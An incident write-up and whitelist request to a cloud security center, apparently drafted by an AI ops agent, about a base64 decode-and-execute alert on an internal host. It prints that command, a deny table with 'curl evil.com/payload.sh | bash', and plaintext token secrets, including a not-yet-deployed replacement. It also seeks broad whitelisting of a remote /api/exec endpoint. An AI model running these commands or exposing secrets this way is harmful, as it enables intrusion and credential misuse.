# 云安全中心 - 白名单申请文档 (V007.67)

> **申请时间**: 2026-07-14
> **目标主机**: 172.20.59.7 (yonaa)
> **运维方**: Dev Agent V007.67
> **依据**: `.trae/rules/remote-execution-simplicity.md` V3 (7 大铁律)
> **告警来源**: 集团内网安全检查 - "恶意脚本-恶意脚本代码执行"

---

## 一、告警事件总结 (背景)

### 已发生事件
集团云安全中心检测到 `172.20.59.7` 触发"恶意脚本代码执行"告警，命令内容：
```bash
bash -c "echo CmltcG9ydCB1cmxsaWIu...== | base64 -d > /tmp/_verify.py && python3 /tmp/_verify.py; rm -f /tmp/_verify.py"
```

### 调查结论
1. **不是入侵**：base64 解码后内容是 agent 自己写的健康检查脚本（无害）
2. **真实原因**：yonaa 上的 `/opt/app/shared/monitor_prod.py` (7/13 19:01 版本) 含 `script_remote()` 函数，使用 base64 + /tmp/m.py 模式
3. **触发链路**：crond → log_service_watchdog.sh → deploy_prod.sh → start_log.sh → log_service.py → bash base64 模式

### 已采取行动 (V007.67)
| 行动 | 状态 |
|---|---|
| 替换 monitor_prod.py (移除 base64) | ✅ 完成 |
| 删除 _test_root_cause.py (含 base64) | ✅ 完成 |
| 删除 17 个 _*.py 临时脚本 | ✅ 完成 |
| 修复 deploy_prod.sh (避免 inline python3 -c) | ✅ 完成 |
| 新增 parse_health.py (替代 inline python3 -c) | ✅ 完成 |

**修复后**: yonaa 上 0 个真实 base64 模式, 0 个 _verify.py 残留, 0 个 python3 -c 模式。

---

## 二、白名单申请 (按类别)

### A. 进程级白名单 (合法服务进程)

| 进程名 | 路径 | PID (示例) | 启动用户 | 用途 |
|---|---|---|---|---|
| `crond` | `/usr/sbin/crond -n` | 587 | root | 系统定时任务 |
| `python log_service.py` | `/opt/miniconda3-py39/bin/python log_service.py` | 31939 | root | 可观测性服务 (9101) |
| `python core_service.py` | `/opt/miniconda3-py39/bin/python core_service.py` | 21353 | root | 数据 CRUD 服务 (9200 HTTPS) |
| `python dbops_service.py` | `/opt/miniconda3-py39/bin/python dbops_service.py` | 24722 | root | DB 操作服务 (9204) |
| `python error_aggregator_service.py` | `/opt/miniconda3-py39/bin/python error_aggregator_service.py` | 24724 | root | 错误聚合服务 (9205) |
| `python service_health_supervisor.py` | `/opt/miniconda3-py39/bin/python service_health_supervisor.py` | (动态) | root | 健康监控守护 |
| `python ops_scheduler.py` | `/opt/miniconda3-py39/bin/python ops_scheduler.py` | (动态) | root | 定时任务调度 (9202) |
| `python observability_service.py` | `/opt/miniconda3-py39/bin/python observability_service.py` | (动态) | root | 指标收集 (9201) |
| `python config_service.py` | `/opt/miniconda3-py39/bin/python config_service.py` | (动态) | root | 配置服务 (9203) |
| `python slo_service.py` | `/opt/miniconda3-py39/bin/python slo_service.py` | (动态) | root | SLO 监控 |
| `python health_service.py` | `/opt/miniconda3-py39/bin/python health_service.py` | (动态) | root | 健康检查 |
| `python debug_service.py` | `/opt/miniconda3-py39/bin/python debug_service.py` | (动态) | root | 调试服务 |
| `python unified_8081.py` | `/usr/bin/python3 /tmp/unified_8081.py /opt/app/deployments/frontend_dist_files` | 19793 | root | 前端代理 (8081) |

### B. 文件级白名单 (合法运维脚本)

#### B.1 服务 .py (核心业务)
| 路径 | 大小 | 修改时间 | 用途 |
|---|---|---|---|
| `/opt/app/shared/log_service.py` | 110867 B | 2026-07-13 21:57 | log_service v4.11 (9101) |
| `/opt/app/shared/core_service.py` | 30665 B | 2026-07-14 15:30 | core_service (9200 HTTPS) |
| `/opt/app/shared/dbops_service.py` | 18835 B | 2026-07-12 15:59 | dbops_service (9204) |
| `/opt/app/shared/error_aggregator_service.py` | 22353 B | 2026-07-12 15:00 | error_aggregator (9205) |
| `/opt/app/shared/config_service.py` | 12525 B | 2026-07-12 15:59 | config_service (9203) |
| `/opt/app/shared/observability_service.py` | 18916 B | 2026-07-11 23:54 | observability (9201) |
| `/opt/app/shared/ops_scheduler.py` | 12285 B | 2026-07-13 09:28 | ops_scheduler (9202) |
| `/opt/app/shared/health_service.py` | 25200 B | 2026-07-12 16:49 | health service |
| `/opt/app/shared/slo_service.py` | 30401 B | 2026-07-12 17:27 | slo service |
| `/opt/app/shared/debug_service.py` | 30875 B | 2026-07-12 17:10 | debug service |
| `/opt/app/shared/service_health_supervisor.py` | 25059 B | 2026-07-12 15:17 | health supervisor |
| `/opt/app/shared/monitor_prod.py` | 14262 B | 2026-07-14 17:36 | **V007.67 修复版**（agent 端健康监控） |
| `/opt/app/shared/parse_health.py` | 596 B | 2026-07-14 17:43 | **V007.67 新增**（替代 inline python3 -c） |

#### B.2 运维脚本 .py
| 路径 | 大小 | 修改时间 | 用途 |
|---|---|---|---|
| `/opt/app/shared/audit_recovery.py` | 10187 B | 2026-07-13 20:47 | DB 审计恢复 |
| `/opt/app/shared/pre_deploy_check.py` | 8864 B | 2026-07-13 20:47 | 部署前检查 |
| `/opt/app/shared/verify_deployment.py` | 8952 B | 2026-07-13 19:01 | 部署验证 |

#### B.3 部署脚本 .sh
| 路径 | 大小 | 修改时间 | 用途 |
|---|---|---|---|
| `/opt/app/shared/deploy_prod.sh` | 4202 B | 2026-07-14 17:43 | **V007.67 修复版**（生产部署） |
| `/opt/app/shared/deploy_prod.sh.v007.49-D.bak` | 3313 B | 2026-07-14 17:36 | 旧版备份 |
| `/opt/app/shared/sync_staging_db.sh` | 3097 B | 2026-07-13 22:20 | staging db 同步 |
| `/opt/app/shared/db_backup.sh` | 2110 B | 2026-07-13 09:16 | DB 备份 |
| `/opt/app/shared/drift_check.sh` | 2503 B | 2026-07-13 22:17 | 漂移检查 |
| `/opt/app/shared/rollback.sh` | 1977 B | 2026-07-13 22:20 | 回滚 |
| `/opt/app/shared/rollback_v2.sh` | 1713 B | 2026-07-13 22:34 | 回滚 v2 |
| `/opt/app/shared/log_archive.sh` | 448 B | 2026-07-13 09:28 | 日志归档 |
| `/opt/app/shared/disk_forecast.sh` | 422 B | 2026-07-13 09:22 | 磁盘预测 |
| `/opt/app/shared/register_crontab.sh` | 817 B | 2026-07-12 14:16 | 注册 crontab |

#### B.4 watchdog 脚本 .sh (排除)
- `*_watchdog.sh` 系列：系统自检脚本，每分钟运行一次
- `start_*.sh` 系列：服务启动脚本
- `deploy_v2.sh`：已废弃，不用

### C. 命令级白名单 (合法调用模式)

#### C.1 合法 Python 调用模式
| 模式 | 用途 | 文件位置 |
|---|---|---|
| `python3 /opt/app/shared/<service>.py` | 启动服务 | systemd / start_*.sh |
| `python3 /opt/app/shared/parse_health.py` | 健康检查解析 | deploy_prod.sh 阶段 5 |
| `python3 /opt/app/shared/monitor_prod.py` | 健康监控 (agent) | agent 远程调用 |

#### C.2 合法 HTTP 调用模式
| URL | 方法 | 用途 |
|---|---|---|
| `http://127.0.0.1:9101/api/exec` | GET | agent 远程执行命令 |
| `http://127.0.0.1:9101/api/upload` | POST | agent 上传文件 |
| `http://127.0.0.1:9101/api/db/health` | GET | 健康检查 |
| `https://127.0.0.1:9200/api/v1/*` | GET/POST | 数据 CRUD |
| `http://127.0.0.1:9101/api/log*` | GET | 日志查询 |

#### C.3 合法 curl 模式
| 模式 | 文件 | 用途 |
|---|---|---|
| `curl -s --max-time 5 http://localhost:9101/api/db/health` | deploy_prod.sh | 健康检查 |
| `curl -s --max-time 5 http://localhost:8081/` | smoke_test.sh 等 | 端口存活 |
| `curl -sk https://localhost:9200/api/v1/auth/dev-login` | 浏览器测试 | 测试登录 |

### D. 路径级白名单 (合法临时路径)

| 路径 | 用途 | 备注 |
|---|---|---|
| `/tmp/agent_*.py` | agent 临时脚本（V007.67 后） | 立即 rm，自动清理 |
| `/tmp/monitor_prod_v007.67.py` | 上传中转（已清理） | 单次使用 |
| `/tmp/deploy_prod.sh.v007.67` | 上传中转（已清理） | 单次使用 |
| `/tmp/_parse_health*.db` | dbops_service 验证 | 自动清理 |

### E. Token / 命令模式白名单

| Token secret | 用途 | 备注 |
|---|---|---|
| `v007.35-infra` | log_service 9101 调用 | ⚠️ **已知暴露, 需轮换** |
| `v007.67-infra` | V007.67 新版 (待部署) | 计划替代 v007.35 |

---

## 三、明确**不应**加入白名单的反模式

| 反模式 | 原因 |
|---|---|
| `bash -c "echo $B64 \| base64 -d \| bash"` | 木马启发式，L5 |
| `bash -c "echo $B64 \| base64 -d > /tmp/*.py && python3 /tmp/*.py"` | 触发告警的精确模式，L2 |
| `python3 -c "..."` (inline 调用) | 启发式误报，建议改用独立脚本 |
| `curl https://evil.com/payload.sh \| bash` | 反向 shell，P0 |
| `ssh root@...` (yonaa 无 SSH) | 不存在的路径 |
| `127.0.0.1` 自调用 log_service (远端脚本内) | L1 反模式 |

---

## 四、V007.67 修复证据

### 4.1 修复前后对比

| 文件 | 修复前 | 修复后 |
|---|---|---|
| `monitor_prod.py` | 9951 B (含 base64 + script_remote base64) | 14262 B (HTTP /api/upload 明文) |
| `deploy_prod.sh` | 3313 B (inline python3 -c) | 4202 B (parse_health.py 独立脚本) |
| `_test_root_cause.py` | 4312 B (含 base64) | **删除** |
| `*.multipart_bak` | 2 个 | **删除** |
| `_*.py` (临时脚本) | 17 个 | **0 个** |

### 4.2 当前 yonaa 真实状态

```
[1] 所有 _*.py 含 base64.b64encode 真实模式
[OK] 所有 _*.py 都不含真实 base64 模式

[2] 阶段 5 实际 python3 调用 (排除注释)
89:        INT=$(echo "$HEALTH" | python3 "$PARSE_HEALTH" 2>/dev/null)

[3] E2E 验证 (curl + parse_health.py)
RAW: { "integrity": "ok", "users": 6, "roles": 4, ... }
PARSED: ok  ✓

[4] 当前所有进程 (确认无 base64/_verify)
(无 base64/_verify 进程)
```

### 4.3 git 提交记录

```
839e75d feat(tools): parse_health.py + deploy_prod.sh v007.67 [L2+L5 修复 deploy 链路]
50ed9ec feat(tools): run_security_audit.py - 统一安全审计入口 [L2+L4+L5+L6+L7]
72dc9ca feat(tools): check_unsafe_patterns.py - 检测 base64+bash 反模式 [L2+L5 审计]
66a0605 feat(tools): check_credential_leak.py - 静态扫描密码留痕 [L7 审计]
b2f9f43 feat(tools): check_listen_bind_audit.py - 静态扫描 0.0.0.0 绑定 [L4 审计]
1d9da66 fix(monitor): 移除 script_remote base64 + bash -c 反模式 [L2+L5 修复]
a37f1bd feat(tools): remote_helper.py - 安全的 HTTP+token 远程执行库 [L1+L2+L5 修复]
```

---

## 五、白名单申请请求

### 5.1 进程白名单 (推荐申请)

请将以下进程加入"系统服务白名单"：
- `/opt/miniconda3-py39/bin/python` 启动的所有 `/opt/app/shared/*.py` 服务进程
- `/usr/sbin/crond -n` 系统定时任务

### 5.2 路径白名单 (推荐申请)

请将以下目录加入"运维脚本白名单"：
- `/opt/app/shared/*.py` （服务 + 运维）
- `/opt/app/shared/*.sh` （部署 + 启动 + watchdog）
- `/opt/app/shared/parse_health.py` （V007.67 新增）
- `/opt/app/shared/monitor_prod.py` （V007.67 修复）

### 5.3 命令白名单 (推荐申请)

请将以下模式加入"合法运维命令白名单"：
- `python3 /opt/app/shared/<service>.py` （启动服务）
- `python3 /opt/app/shared/parse_health.py` （健康检查）
- `bash /opt/app/shared/start_*.sh` （启动服务）
- `bash /opt/app/shared/deploy_prod.sh` （部署）
- `bash /opt/app/shared/*_watchdog.sh` （看门狗）

### 5.4 HTTP 白名单 (推荐申请)

请将以下 URL 加入"合法内部调用白名单"：
- `http://127.0.0.1:9101/api/*` （log_service 内网调用）
- `http://localhost:9101/api/*` （同 hostname）
- `https://127.0.0.1:9200/api/*` （core_service HTTPS）
- `http://localhost:8081/` （unified_8081.py 前端代理）
- `http://localhost:3011/` （Flask 后端）

---

## 六、未来预防措施

### 6.1 已就绪的审计工具

- `python tools/run_security_audit.py` —— 一键审计 L2+L4+L5+L6+L7
- `python tools/check_unsafe_patterns.py tools/` —— CI 集成阻止 base64+bash 反模式
- `python tools/check_credential_leak.py docs/` —— 阻止密码留痕

### 6.2 Token secret 轮换计划

- **24 小时内**: 替换 `v007.35-infra` 为 `v007.67-infra` （新 secret）
- 更新位置：
  - yonaa: `/opt/app/shared/log_service.py` (`TOKEN_SECRET`)
  - agent: `tools/remote_helper.py` (`DEFAULT_SECRET`)
  - `monitor_prod.py` (`secret='v007.35-infra'`)

### 6.3 监控规则

- 部署 `run_security_audit.py` 到 yonaa 每日 cron
- 告警立即推送 Slack / 邮件
- 部署前必须通过 `pre_deploy_check.py` 审计

---

## 七、联系方式

- **运维负责人**: Dev Agent V007.67
- **技术文档**: `.trae/rules/remote-execution-simplicity.md` V3
- **git 分支**: `release/pre-2026-06-29`
- **最新 commit**: `839e75d` (2026-07-14)

---

**申请方**: Dev Agent
**日期**: 2026-07-14
**状态**: 待安全中心审核
